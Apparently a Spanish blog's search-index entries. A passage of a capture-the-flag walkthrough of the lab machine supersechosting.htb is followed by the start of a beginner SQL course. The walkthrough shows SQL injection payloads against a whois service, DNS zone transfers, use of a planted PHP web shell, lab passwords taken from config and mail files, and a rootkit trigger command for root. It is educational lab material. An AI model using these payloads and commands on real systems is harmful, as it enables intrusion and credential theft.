10. 3-P4-Debian80/tcp open http  Apache httpd 2. 4. 25 ((Debian))|_http-title: Site doesn't have a title (text/html). |_http-server-header: Apache/2. 4. 25 (Debian)1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap. org/cgi-bin/submit. cgi?new-service :Service detection performed. Please report any incorrect results at https://nmap. org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 114. 00 secondsVisulizamos informacion interesante de los puertos escaneados:       Puerto   Servicio   Versión         21   FTP   vsftpd 3. 0. 3       22   SSH   OpenSSH 7. 4p1 Debian 10+deb9u4       43   WHOIS   whois?       53   DNS   ISC BIND 9. 10. 3-P4       80   HTTP   Apache httpd 2. 4. 25   EXPLOTACION #: Observamos un servicio web ejecutandose en el puerto 80 y en el puerto 43 obtenemos un dominio que vamos a proceder a añadir en nuestro /etc/hosts. ❯ echo  10. 10. 10. 155 supersechosting. htb www. supersechosting. htb  &gt;&gt; /etc/hostsSi ahora intentamos visualizar el servicio en el navegador se nos muestra un mensaje de que el servicio no esta disponible.  Ahora ya que nmap tambien nos reporto que el puerto 53 se encuentra abierto asi que con la herramienta dig vamos a intentar realizar un ataque de transferencia de zona, para poder obtener dominios validos. ❯ dig @10. 10. 10. 155 supersechosting. htb axfr; &lt;&lt;&gt;&gt; DiG 9. 16. 27-Debian &lt;&lt;&gt;&gt; @10. 10. 10. 155 supersechosting. htb axfr; (1 server found);; global options: +cmdsupersechosting. htb. 	604800	IN	SOA	ns1. supersechosting. htb. root. supersechosting. htb. 3 604800 86400 2419200 604800supersechosting. htb. 	604800	IN	NS	ns1. supersechosting. htb. supersechosting. htb. 	604800	IN	MX	10 mail1. supersechosting. htb. supersechosting. htb. 	604800	IN	A	10. 10. 10. 155ftp. supersechosting. htb. 604800	IN	A	10. 10. 10. 155mail1. supersechosting. htb. 604800 IN	A	10. 10. 10. 155ns1. supersechosting. htb. 604800	IN	A	10. 10. 10. 155whois. supersechosting. htb. 604800 IN	A	10. 10. 10. 155www. supersechosting. htb. 604800	IN	A	10. 10. 10. 155supersechosting. htb. 	604800	IN	SOA	ns1. supersechosting. htb. root. supersechosting. htb. 3 604800 86400 2419200 604800;; Query time: 436 msec;; SERVER: 10. 10. 10. 155#53(10. 10. 10. 155);; WHEN: Fri Jun 23 22:23:59 GMT 2023;; XFR size: 10 records (messages 1, bytes 275)Obtenemos una lista de subdominios que validaremos, despues de añadirlos a nuestro /etc/hosts. ❯ echo  10. 10. 10. 155 ftp. supersechosting. htb mail1. supersechosting. htb ns1. supersechosting. htb whois. supersechosting. htb www. supersechosting. htb  &gt;&gt; /etc/hostsLogramos resolver un dominio, el cual nos da información acerca del servicio, como que se esta usando php y mysql, ademas tambien podemos ver información acerca de whois que curiosamente tiene expuesto la maquina.  Al conectarnos a whois a traves de telnet, vemos que utiliza como base de datos el servicio de mariadb. ❯ telnet 10. 10. 10. 155 43Trying 10. 10. 10. 155. . . Connected to 10. 10. 10. 155. Escape character is '^]'. % SUPERSECHOSTING WHOIS server v0. 6beta@MariaDB10. 1. 37% for more information on SUPERSECHOSTING, visit http://www. supersechosting. htb% This query returned 0 objectConnection closed by foreign host. El servicio WHOIS siempre necesita utilizar una base de datos para almacenar y extraer la información. Por lo tanto, una posible SQLInjection podría funcionar al consultar la base de datos. ❯ nc 10. 10. 10. 155 43'% SUPERSECHOSTING WHOIS server v0. 6beta@MariaDB10. 1. 37% for more information on SUPERSECHOSTING, visit http://www. supersechosting. htb1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '''') limit 1' at line 1Mandamos una ' en la consulta y vemos que recibimos un error de sql. ❯ nc 10. 10. 10. 155 43') ORDER BY 2#% SUPERSECHOSTING WHOIS server v0. 6beta@MariaDB10. 1. 37% for more information on SUPERSECHOSTING, visit http://www. supersechosting. htb% This query returned 0 objectVamos a proceder a enumear la base de datos. ❯ nc 10. 10. 10. 155 43') UNION SELECT database(), 2#% SUPERSECHOSTING WHOIS server v0. 6beta@MariaDB10. 1. 37% for more information on SUPERSECHOSTING, visit http://www. supersechosting. htb% This query returned 1 objectwhois❯ nc 10. 10. 10. 155 43') UNION SELECT table_name,2 from information_schema. tables where table_schema='whois'#% SUPERSECHOSTING WHOIS server v0. 6beta@MariaDB10. 1. 37% for more information on SUPERSECHOSTING, visit http://www. supersechosting. htb% This query returned 1 objectcustomers❯ nc 10. 10. 10. 155 43') UNION SELECT column_name, 2 from information_schema. columns where table_name= customers  and table_schema= whois  LIMIT 0,1#% SUPERSECHOSTING WHOIS server v0. 6beta@MariaDB10. 1. 37% for more information on SUPERSECHOSTING, visit http://www. supersechosting. htb% This query returned 1 objectid^C❯ nc 10. 10. 10. 155 43') UNION SELECT column_name, 2 from information_schema. columns where table_name= customers  and table_schema= whois  LIMIT 1,1#% SUPERSECHOSTING WHOIS server v0. 6beta@MariaDB10. 1. 37% for more information on SUPERSECHOSTING, visit http://www. supersechosting. htb% This query returned 1 objectdomain^C❯ nc 10. 10. 10. 155 43') UNION SELECT column_name, 2 from information_schema. columns where table_name= customers  and table_schema= whois  LIMIT 2,1#% SUPERSECHOSTING WHOIS server v0. 6beta@MariaDB10. 1. 37% for more information on SUPERSECHOSTING, visit http://www. supersechosting. htb% This query returned 1 objectdata❯ nc 10. 10. 10. 155 43') UNION SELECT domain, 2 FROM customers#% SUPERSECHOSTING WHOIS server v0. 6beta@MariaDB10. 1. 37% for more information on SUPERSECHOSTING, visit http://www. supersechosting. htb% This query returned 4 objectsupersechosting. htbjustanotherblog. htbpwnhats. htbrentahacker. htbEncontramos mas subdominios y entre ellos uno curioso rentahacker. htb, que si lo vemos en la pagina web no nos muestra información, pero podemos ejecutar un ataque de transferencia de zona de este subdominio. ❯ dig @10. 10. 10. 155 rentahacker. htb axfr; &lt;&lt;&gt;&gt; DiG 9. 16. 27-Debian &lt;&lt;&gt;&gt; @10. 10. 10. 155 rentahacker. htb axfr; (1 server found);; global options: +cmdrentahacker. htb. 	604800	IN	SOA	ns1. supersechosting. htb. root. supersechosting. htb. 4 604800 86400 2419200 604800rentahacker. htb. 	604800	IN	NS	ns1. supersechosting. htb. rentahacker. htb. 	604800	IN	MX	10 mail1. rentahacker. htb. rentahacker. htb. 	604800	IN	A	10. 10. 10. 155mail1. rentahacker. htb. 	604800	IN	A	10. 10. 10. 155sec03. rentahacker. htb. 	604800	IN	A	10. 10. 10. 155www. rentahacker. htb. 	604800	IN	A	10. 10. 10. 155rentahacker. htb. 	604800	IN	SOA	ns1. supersechosting. htb. root. supersechosting. htb. 4 604800 86400 2419200 604800;; Query time: 443 msec;; SERVER: 10. 10. 10. 155#53(10. 10. 10. 155);; WHEN: Fri Jun 23 22:49:07 GMT 2023;; XFR size: 8 records (messages 1, bytes 251)Obtenemos dos subdominios nuevos que luego de añadirlos, visualizamos una pagina en sec03. rentahacker. htb con una imagen en relación a un hacker que ya nos da que pensar.  Anteriormente en uno de los subdominios vemos que se estaba utilizando como lenguaje a php, asi que vamos a tratar de buscar archivos con esa extensión con la ayuda de wfuzz. ❯ wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2. 3-medium. txt http://sec03. rentahacker. htb/FUZZ. php /usr/lib/python3/dist-packages/wfuzz/__init__. py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information. ********************************************************* Wfuzz 3. 1. 0 - The Web Fuzzer             *********************************************************Target: http://sec03. rentahacker. htb/FUZZ. phpTotal requests: 220560=====================================================================ID      Response  Lines  Word    Chars    Payload                                                        =====================================================================000000015:  302    0 L   0 W    0 Ch     index                                                         000000217:  200    57 L   340 W   4729 Ch    signup                                                        000000027:  302    0 L   0 W    0 Ch     search                                                        000000053:  200    57 L   339 W   4712 Ch    login                                                         000000685:  200    0 L   0 W    0 Ch     core                                                         000000190:  200    57 L   332 W   4667 Ch    wiki                                                         000001688:  200    0 L   0 W    0 Ch     shell Encontramos un archivo con un nombre muy descriptivo shell que curiosamente existe, y quiero pensar que al ser una shell debe ejecutarse a traves de un parametro que si bien no sabemos el nombre, con wfuzz igualmente podemos tratar de averiguarlo ejecutando un comando.  ❯ wfuzz -c --hc=404 -t 200 --hw=0 -w /usr/share/wordlists/dirbuster/directory-list-2. 3-medium. txt  http://sec03. rentahacker. htb/shell. php?FUZZ=whoami  /usr/lib/python3/dist-packages/wfuzz/__init__. py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information. ********************************************************* Wfuzz 3. 1. 0 - The Web Fuzzer             *********************************************************Target: http://sec03. rentahacker. htb/shell. php?FUZZ=whoamiTotal requests: 220560=====================================================================ID      Response  Lines  Word    Chars    Payload                                                        =====================================================================000012593:  200    1 L   1 W    8 Ch     hidden                                                        000014350:  200    0 L   0 W    0 Ch     guildwars                                                       Obtenemos que el nombre parametro corresponde a hidden y si lo validamos tenemos ejecución de comandos.  Si ahora tratamos de mandarnos una reverse shell a nuestra maquina, vemos que nos resulta imposible debido a que la maquina tiene implementado reglas de firewall. Por ello para poder movernos de manera mas comoda vamos a usar una herramienta que nos permite tener acceso a una tty sobre http.  tty_over_http. pyPara usarla simplemente debemos modificar la dirección url y el parametro al que corresponde nuestra shell.  ❯ rlwrap python3 tty_over_http. pywhoami&gt; ib01c03ls -l /home&gt; total 24drwx------ 4 ib01c01 customers 4096 Sep 1 2021 ib01c01drwx------ 3 ib01c02 customers 4096 Sep 1 2021 ib01c02drwx------ 4 ib01c03 customers 4096 Sep 1 2021 ib01c03dr-xrwx--- 3 ib01ftp support  4096 Dec 10 2018 ib01ftpdrwx------ 3 ib01www support  4096 Dec 10 2018 ib01wwwdrwx------ 2 support support  4096 Sep 13 2022 supportls -l /home/ib01c03&gt; total 26576-rw-r--r-- 1 ib01c03 customers 16689687 Oct 17 2018 bugtracker. 2. 18. tgzdrwxr-xr-x 15 ib01c03 customers  12288 Dec 10 2018 sec03-rw-r--r-- 1 ib01c03 customers 10503584 Dec 6 2018 wordpress. tgzdrwxr-xr-x 5 ib01c03 customers   4096 Sep 1 2021 wwwVemos un archivo comprimido en wordpress, asi que podemos tratar de buscar el archivo wp-config. php que generalmente contiene credenciales. find / -name wp-config. php 2&gt;/dev/null&gt; /home/ib01c03/www/wp-config. phpcat /home/ib01c03/www/wp-config. php&gt; &lt;?php The name of the database for WordPress /define('DB_NAME', 'ib01c03'); MySQL database username /define('DB_USER', 'ib01c03'); MySQL database password /define('DB_PASSWORD', 'Thi$sh1tIsN0tGut'); MySQL hostname /define('DB_HOST', 'localhost');Obtenemos unas credenciales validas pero que correspoden al mismo usuario ib01c03, ahora recordemos que cuando obtuvimos subdominios, se nos reporto uno asociado a mail1. rentahacker. htb, por ello podemos listar la ruta /var/spool/mail buscando información. ls -l /var/spool/mail/*&gt; -rw-rw-r-- 1 root mail 1274 Dec 10 2018 /var/spool/mail/ib01c03-rw-rw---- 1 root mail 1043 Dec 11 2018 /var/spool/mail/supportVemos que existe un correo el cual al leerlo obtenemos las credenciales del usuario ib01ftp:YhgRt56_Ta. cat /var/spool/mail/ib01c03&gt; From support@ib01. supersechosting. htb Mon Dec 10 21:10:56 2018Return-path: &lt;support@ib01. supersechosting. htb&gt;Envelope-to: ib01c03@ib01. supersechosting. htbDelivery-date: Mon, 10 Dec 2018 21:10:56 +0100Received: from support by ib01. supersechosting. htb with local (Exim 4. 89)	(envelope-from &lt;support@ib01. supersechosting. htb&gt;)	id 1gWRtI-0000ZK-8Q	for ib01c03@ib01. supersechosting. htb; Mon, 10 Dec 2018 21:10:56 +0100To: &lt;ib01c03@ib01. supersechosting. htb&gt;Subject: Re: Please help! Site Defaced!In-Reply-To: Your message of Mon, 10 Dec 2018 21:04:49 +0100	&lt;E1gWRnN-0000XA-44@ib01. supersechosting. htb&gt;References: &lt;E1gWRnN-0000XA-44@ib01. supersechosting. htb&gt;X-Mailer: mail (GNU Mailutils 3. 1. 1)Message-Id: &lt;E1gWRtI-0000ZK-8Q@ib01. supersechosting. htb&gt;From: support &lt;support@ib01. supersechosting. htb&gt;Date: Mon, 10 Dec 2018 21:10:56 +0100X-IMAPbase: 1544472964 2Status: OX-UID: 1&gt;&gt; Please we need your help. Our site has been defaced!&gt;&gt; What we should do now?&gt;&gt;&gt;&gt; rentahacker. htbHi, we will check when possible. We are working on another incident right now. We just make a backup of the apache logs. Please check if there is any strange file in your web root and upload it to the ftp server:ftp. supersechosting. htbuser: ib01ftppass: YhgRt56_TaThanks. Como las credenciales estan asociadas a ftp y el puerto se encuentra abierto probamos a conectarnos. ❯ ftp 10. 10. 10. 155Connected to 10. 10. 10. 155. 220 (vsFTPd 3. 0. 3)Name (10. 10. 10. 155:fmiracle): ib01ftp331 Please specify the password. Password:230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp&gt; dir200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. dr-xrwx---  4 1005   1000     4096 Dec 10 2018 incidents226 Directory send OK. ftp&gt; cd incidents250 Directory successfully changed. ftp&gt; dir200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. dr-xrwx---  2 1005   1000     4096 Jan 30 2019 ib01c01dr-xrwx---  2 1005   1000     4096 Dec 10 2018 ib01c03226 Directory send OK. ftp&gt; cd ib01c01250 Directory successfully changed. ftp&gt; dir200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -r--rw-r--  1 1005   1000    10427 Dec 10 2018 ib01c01. access. log-rw-r--r--  1 1000   1000    835084 Dec 10 2018 ib01c01_incident. pcap-r--rw-r--  1 1005   1000     173 Dec 11 2018 notes. txt226 Directory send OK. Al conectarnos vemos un archivo log, una nota y un archivo pcap, los cuales vamos a traernos a nuestra maquina. ftp&gt; binary on200 Switching to Binary mode. ftp&gt; prompt offInteractive mode off. ftp&gt; mget *local: ib01c01. access. log remote: ib01c01. access. log200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for ib01c01. access. log (10427 bytes). 226 Transfer complete. 10427 bytes received in 0. 45 secs (22. 5332 kB/s)local: ib01c01_incident. pcap remote: ib01c01_incident. pcap200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for ib01c01_incident. pcap (835084 bytes). 226 Transfer complete. 835084 bytes received in 4. 99 secs (163. 5452 kB/s)local: notes. txt remote: notes. txt200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for notes. txt (173 bytes). 226 Transfer complete. 173 bytes received in 0. 00 secs (861. 9659 kB/s)La nota nos da una pista. ❯ cat notes. txtAfter checking the logs and the network capture, all points to that the attacker knows valid credentials and abused a recently discovered vuln to gain access to the server!Analizando la captura con tshark obtenemos una contraseña. ❯ tshark -r ib01c01_incident. pcap -Y  http. request. method==POST  -Tfields -e 'tcp. payload' | xxd -ps -rRunning as user  root  and group  root . This could be dangerous. POST /admin530o6uisg/index. php?rand=1544475115839 HTTP/1. 1Host: www. pwnhats. htbUser-Agent: Mozilla/5. 0 (X11; Linux x86_64; rv:60. 0) Gecko/20100101 Firefox/60. 0Accept: application/json, text/javascript, */*; q=0. 01Accept-Language: en-US,en;q=0. 5Accept-Encoding: gzip, deflateReferer: http://www. pwnhats. htb/admin530o6uisg/index. php?controller=AdminLogin&amp;token=de267fd50b09d00b04cca76ff620b201Content-Type: application/x-www-form-urlencoded; charset=UTF-8cache-control: no-cacheX-Requested-With: XMLHttpRequestContent-Length: 195ajax=1&amp;token=&amp;controller=AdminLogin&amp;submitLogin=1&amp;passwd=GetYouAH4t%21&amp;email=pwnhats%40pwnhats. htb&amp;redirect=http%3a//www. pwnhats. htb/admin530o6uisg/%26token%3de44d0ae2213d01986912abc63712a05bPOST /admin530o6uisg/index. php?controller=AdminCustomerThreads&amp;token=8d8e4db864318da7655c7f2d8175815f HTTP/1. 1Host: www. pwnhats. htbUser-Agent: Mozilla/4. 0 (compatible; MSIE 6. 0; Windows NT 5. 1)Si urldecodeamos la contraseña, obtemos que es equivalente a GetYouAH4t!. ❯ php --interactiveInteractive mode enabledphp &gt; echo urldecode( GetYouAH4t%21 );GetYouAH4t!php &gt;Como el propieatio de la captura era el usuario ib01c01 vamos a conectarnos con ese usuario haciendo uso de la credencial obtenida. ❯ ftp 10. 10. 10. 155Connected to 10. 10. 10. 155. 220 (vsFTPd 3. 0. 3)Name (10. 10. 10. 155:fmiracle): ib01c01331 Please specify the password. Password:230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp&gt; dir200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-------  1 1001   1004      32 Jan 30 2019 access. txt-rw-r--r--  1 1001   1004   68175351 Dec 07 2018 prestashop_1. 7. 4. 4. zip-rw-r-----  1 0    1004      33 Jun 24 00:10 user. txtdrwxr-xr-x  26 1001   1004     4096 Sep 01 2021 www226 Directory send OK. Ahora proderemos a traernos y visualizar la primera flag user. txt. ❯ cat user. txte8dd26ca8a139f83116a1744aa6d1826ELEVACION DE PRIVILEGIOS #: Si bien examinamos por encima el archivo pcap con la ayuda de tshark, vamos a volver a examinarlo esta vez mediante wireshark. Al abrirnos wireshark, vemos que en el archivo pcap existen peticiones GET a un archivo de nombre root. c.  Si seguimos el fujo tcp para tratar de ver el contenido, obsevamos todo el script en C.  Dentro del script, vemos una cadena Got r00t, que llama mucho la atención y podemos ponernos a pensar que se trata de un rootkit y si tratamos de investigar esa cadena del script, vemos un articulo que nos confirma que se trata de un rootkit y nos dice como podemos aprovecharnos de este.  https://0x00sec. org/t/kernel-rootkits-getting-your-hands-dirty/1485Basicamente lo que hace es cargar un modulo llamado root. ko y al enviar la cadena echo  g0tR0ot  &gt; /dev/ttyR0; comando, esta lo ejecutara como root. Probamos a ejecutar la cadena, pero vemos que lo ejecutamos como nuestro usuario, y esto quiero pensar que es debido a que si bien el proceso de rootkit es el mismo, la cadena debe de ser distinta. ❯ rlwrap python3 tty_over_http. pyecho  g0tR0ot  &gt; /dev/ttyR0; whoami&gt; ib01c03Por ello necesitamos encontrar el root. ko que en principio es el que carga el rootkit. Si nos volvemos a conectar como el usuario ib01c01, y listamos los archivo ocultos vemos uno inusual . . . y si ingresamos al directorio encontramos el root. ko. ❯ ftp 10. 10. 10. 155Connected to 10. 10. 10. 155. 220 (vsFTPd 3. 0. 3)Name (10. 10. 10. 155:fmiracle): ib01c01331 Please specify the password. Password:230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp&gt; ls -la200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwx------  4 1001   1004     4096 Sep 01 2021 . drwxr-xr-x  8 0    0      4096 Dec 07 2018 . . drwxr-xr-x  2 1001   1004     4096 Feb 02 2019 . . . lrwxrwxrwx  1 0    0        9 Sep 01 2021 . bash_history -&gt; /dev/null-rw-------  1 1001   1004      32 Jan 30 2019 access. txt-rw-r--r--  1 1001   1004   68175351 Dec 07 2018 prestashop_1. 7. 4. 4. zip-rw-r-----  1 0    1004      33 Jun 24 00:10 user. txtdrwxr-xr-x  26 1001   1004     4096 Sep 01 2021 www226 Directory send OK. ftp&gt; cd . . . 250 Directory successfully changed. ftp&gt; ls200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-r--r--  1 0    0     399400 Feb 02 2019 root. ko226 Directory send OK. ftp&gt; Vamos a traernos el archivo y examinarlo con nuestra maquina con radare2. ftp&gt; get root. kolocal: root. ko remote: root. ko200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for root. ko (399400 bytes). 226 Transfer complete. 399400 bytes received in 3. 94 secs (98. 9888 kB/s)ftp&gt; quit❯ radare2 root. koWarning: run r2 with -e bin. cache=true to fix relocations in disassembly -- give | and &gt; a try piping and redirection[0x08000070]&gt; aaa[x] Analyze all flags starting with sym. and entry0 (aa)[x] Analyze all functions arguments/locals[x] Analyze function calls (aac)[x] Analyze len bytes of instructions for references (aar)[x] Finding and parsing C++ vtables (avrr)[x] Type matching analysis for all functions (aaft)[x] Propagate noreturn information (aanr)[x] Use -AA or aaaa to perform additional experimental analysis. [0x08000070]&gt; afl0x08000070  1 8      sym. root_open0x08000080  1 9      sym. root_read0x08000090  11 359     sym. root_write0x080001f7  7 292     sym. root_init0x0800031b  1 82      sym. root_exit[0x08000070]&gt; s sym. root_write[0x08000090]&gt; pdfAl examinarlo vemos que la cadena g0tR0ot fue reemplaza por la cadena en dos partes g3tPr1v, asi que vamos a probar mandando esta nueva cadena.  ❯ rlwrap python3 tty_over_http. pyecho  g3tPr1v  &gt; /dev/ttyR0; whoami&gt; rootEsta vez vemos que el rootkit si funciona, asi que ahora que tenemos privilegios como root solo nos quedaria visualizar la segunda flag root. txt. echo  g3tPr1v  &gt; /dev/ttyR0; cat /root/root. txt&gt; 8c1482a3a42eb925f6e2a6ed49535065"
    }, {
    "id": 26,
    "url": "http://localhost:4000/articulos/SQL",
    "title": "Aprende SQL desde cero y dominalo como un experto",
    "body": "2023/06/20 - En esta ocasion hablaremos del lenguaje de programación mas utilizado del mundo, exacto me refiero a SQL, realizaremos todo un curso completo desde cero y explicaremos todo lo necesario para que puedas dominarlo en su totalidad, asi que comenzemos ya que debes aprenderlo ahora mismo!. QUE ES SQL? #: Como mencionamos anteriormente SQL es un lenguaje de programación, como?, si es un lenguaje de programación y nos sirve para almacenar y procesar información en una base de datos relacional. Pero que es una base de datos relaciona? Pues una base de datos relacional almacena información en forma de tabla, con filas y columnas que representan diferentes atributos de datos y las diversas relaciones entre los valores de datos. POR QUE DEBO APRENDER SQL? #: Es necesario aprenderlo ya que es un lenguaje de consulta popular que se usa con frecuencia en todos los tipos de aplicaciones. Los analistas y desarrolladores de datos aprenden y usan SQL porque se integra bien con los diferentes lenguajes de programación. INDICE Y ESTRUCTURA:  Que es SQL Por que debo aprender SQL? Tipos de Bases de datos SQL  Instalación Crear Base de Datos - CREATE DATABASE Crear Tabla - CREATE TABLE     Campos   Registros   Valor de Campo   Columnas   Insertar Valores en Tabla - INSERT INTO    Consultas o Querys Instrucción SELECT Modificar Tabla - ALTER TABLE     Renombrar Tabla   Renombrar Columna   Agregar Columna   Eliminar Columna    Instrucción DROP     Eliminar Base de Datos - DROP DATABASE   Eliminar Tabla - DROP TABLE    Identificadores Claves Primarias - PRIMARY KEYS Instrucción DELETE Claves Foraneas - FOREIGN KEYS Clausula AS o ALIAS Clausula ORDER BY Clausula WHERE Instrucción UPDATE Operadores en SQL     Operadores AND Y OR         Operador AND     Operador OR          Operador NOT   Operador LIMIT   Operador DISTINCT   Operador BETWEEN   Operador LIKE   Operador IS NULL y IS NOT NULL   Operador IN y NOT IN    Comentario en SQL Comentar una linea Comentar varias lineas Funciones de Agregación     Función SUM   Función COUNT   Sentencia MIN   Sentencia MAX   Sentencia AVG   Sentencia ROUND    Clausula GROUP BY Clausula HAVING Subconsultas JOINS     CROSS JOIN   INNER JOIN   LEFT JOIN   RIGHT JOIN   FULL JOIN    Clausula UNION Clausula UNION ALL Indices     Indices Ordinarios - INDEX   Indices Primarios - Primary Keys   Indices Unicos - UNIQUE INDEX    Vistas Bloqueos     Bloqueos Compartidos - SHARED LOCKS   Bloqueos Reservados - RESERVED LOCKS   Bloqueos Exclusivos - EXCLUSIVE LOCKS    Transacciones - BEGIN TRANSACTION Procedimientos Almancenados SQL y Python     Funciones Definidas por el Usuario - USER DEFINED FUNCTIONS   TIPOS DE BASES DE DATOS SQL #: Existen muchos tipos de gestores de bases de datos sql, pero afortunadamente, la mayoría son muy parecidos y la lógica es la misma. Tienen alguna que otra sentencia diferente, pero por lo general, aprender un tipo de SQL te permitirá manejar cualquiera de las otras. En este caso concreto para el curso usaremos Sqlite ya que este es el gestor de uso mas comun y es compatible con muchos lenguajes de programación y ademas no tiene servidor de base da datos dedicado para poder ejecutarlo y esta integrado directamente con la aplicación lo que nos facilita su uso. INSTALACIÓN #: La instalación es super sencilla solo debemos ir a la pagina oficial de sqlite para ello aqui dejo el enlace:  https://www. sqlite. org/download. htmlPara este caso ya que lo instalación lo hare en windows, una vez estemos en el enlace debemos descargarnos el archivo de nombre sqlite-tools-win32-x86-3420000. zip. Seguidamente lo descomprimimos y copiamos el contenido en una carpeta creada en la raiz de nuestro disco C:. Seguidamente lo que haremos sera ir a nuestro buscador y buscar Editar las variables del Entorno del Sistema y se nos abrira la siguente ventana: Ahora debemos darle a Variables de Entorno &gt; Path &gt; Editar &gt; Nuevo y pegaremos la ruta de nuestra carpeta donde descomprimimos los archivos y guardamos.  Despues iremos al siguente enlace y descargemos DB Browser for SQLite - Standard installer, dependiendo la version de windows que utilizamos 32 o 64 bits:  https://sqlitebrowser. org/dl/Finalmente solo debemos seguir los pasos simples de instalación: y ya tendriamos sqlite listo para usarlo, damos click en el dbBrowser y se nos abrira la ventana donde vamos a trabajar.  CREAR BASE DE DATOS - CREATE DATABASE #: Para comenzar a crear nuestra primera base de datos en sqlite, podemos hacerlo de dos maneras: La primera seria simplemente ejecutar la palabra reservada CREATE DATABASE y seguidamente el nombre que queremos que tenga nuestra base de datos, en este caso Alumnos. CREATE DATABASE Alumnos;Pero para reprensentarlo de una manera mas visible podemos hacerlo ejecutando en la opcion New Database y le asignamos un nombre, en este caso valga la redundancia Alumnos. db.  Al darle en Gudardar, automaticamente se nos abrira otra ventana, donde nos pide ingresar un campo de nombre Table, para ello tenemos que primer tener en cuenta el concepto de tabla.  CREAR TABLA - CREATE TABLE #: Es una estructura de datos que se almancenan en filas y columnas y estas obviamente deben de tener un nombre.  Para poder crearlas debemos ejecutar la siguente consulta: CREATE TABLE  Alumnos  ();CAMPOS #: Las tablas a su vez tienen campos, los cuales corresponden a los nombres de las columnas.  REGISTROS #: Ademas de contener campos, tambien contienen registros que vendrian a ser cada una de las filas de las tablas.  VALOR DE CAMPO #: Vendria a ser cada uno de los valores de la interseccion entre los campos y los registros.  COLUMNAS #: Anteriormente realizamos la creación de una tabla, pero esta no nos serviria sin antes crear los campos o nombres de las columnas, para ello debemos crear los campos que necesitemos segun el tipo de dato que sera almacenado. Si lo hacemos de manera grafica debemos seleccionar la opcion Add y en Name le indicaremos el nombre que tendra nuestro campo, seguidamente en Type debemos indicar el tipo de dato el cual sera almacenado.  En sqlite existen 5 tipos de datos que podemos usar, estos se corresponden a:  INTEGER: Almacenan valores de tipos de datos enteros.  TEXT: Almancenan valores de cadenas de texto.  BLOB: Almacena datos binarios, como fotos, videos entre otros.  REAL: Almacena numeros flotantes o valores con ,.  NUMERIC: Almacena numeros que necesitan un calculo matematico preciso, no tienen limites a diferencia que real. En base a lo previamente mencionado crearemos 3 campos en nuestra tabla, que correspondera a el Nombre , Apellido y la edad. Haciendolo de manera grafica con el gestor solo tendriamos que agregar mas campos con add y si nos percatamos en la parte de abajo se nos muestra el codigo que deberiamos ejecutar si queremos ejecutar para hacer el mismo proceso mediante una consulta.  Con esto ya tendriamos una base de datos creada con nuestra tabla Alumnos, lo siguiente seria insertar registros en nuestra tabla, ya que por el momento esta se encuentra vacia. INSERTAR VALORES EN TABLA - INSERT INTO #: Para poder insertar valores nos vamos al apartado de Execute SQL. Una vez ahi para añadir valores dentro de nuestra tabla debemos hacer uso de la palabra reservada INSERT INTO, y especificar el nombre de la tabla en este caso Alumnos , abrimos () y digitamos el nombre de los campos , seguidamente usamos la palabra VALUES y de igual manera en () los valores que queremos insertar. Ahora para correr nuestra query solo debemos darle click a el boton run o presionar la combinacion de teclas CTRL + ENTER En la parte de abajo se nos mostrara un mensaje comunicandonos que la consulta se ejecuto sin errores. CONSULTAS O QUERYS #: Una consulta o query son las solicitudes o operaciones que realizamos a una base de datos. Basicamente las consultas se usan para realizar la operaciones basicas CRUD, las cuales son el acronimo de: INSTRUCCION SELECT #: La consulta SELECT, nos devuelve un conjunto de resultados de registros de una o varias tablas. Podemos seleccionar todos los campos haciendo uso de * Tambien podemos seleccionar un campo o mas especificos separandolos por comas ,.  Como resultado nos arroja una tabla nueva con los registros que filtramos. MODIFICAR TABLA - ALTER TABLE #: Esta instrucción nos permite modificar la estructura existente de una tabla de nuestra base de datos, en otras palabras a que despues de haberla creado podemos hacer modificaciones en ella como cambiarle el nombre, agregar, renombrar o quitar columnas y cambiar el tipo de datos. RENOMBRAR TABLA #: Si queremos renombrar el nombre de nuestra tabla, debemos usar la instrucción ALTER TABLE mas el nombre de la tabla actual y seguidamente RENAME TO mas el nombre al cual deseamos cambiar. En este caso aplicaremos el proceso a nuestra tabla Alumnos para renombrarla como Estudiantes.  y de esta manera vemos que se efectua correctamente y ahora si queremos seleccionar los datos de nuestra tabla, debemos hacerlos con el nuevo nombre que ahora corresponde a Estudiantes.  RENOMBRAR COLUMNA #: De la misma manera que renombramos la tabla, tambien podemos hacer el proceso similar para renombrar una columna, para ello debemos ejecutar igualmente la sentencia ALTER TABLE mas la tabla que contenga a la columna, despues RENAME COLUMN mas el nombre actual de la columna y finalmente con TO le especificamos el nombre al cual lo vamos a cambiar. Vamos a verlo de manera practica aplicandolo a la columna edad de nuestra tabla Estudiantes y la renombraremos como Edades.  Ahora volvemos a seleccionar la consulta y vemos que renombramos la columna exitosamente.  AGREGAR COLUMNA #: Ahora supongamos queremos agregar una nueva columna a nuestra tabla Estudiantes que corresponda con el nombre de Profesion, pues esto lo hariamos de manera similiar usando de nueva cuenta ALTER TABLE mas el nombre de nuestra tabla, despues usaremos la palabra reservad ADD y seguidamente el nombre que tendra nuestra columna en conjunto con su tipo de dato.  Si visualizamos nuevamente nuestra tabla Estudiantes observamos que ahora se añadio la columna Profesion.  ELIMINAR COLUMNA #: Para pode eliminar una columna, si supongamos esta no corresponde o cometimos un error al crearla es bastante similar a la creacion de una, solo que en este caso debemos nuevamente usar la sentencia ALTER TABLE con el nombre de la tabla y despues DROP COLUMN mas el nombre del campo a 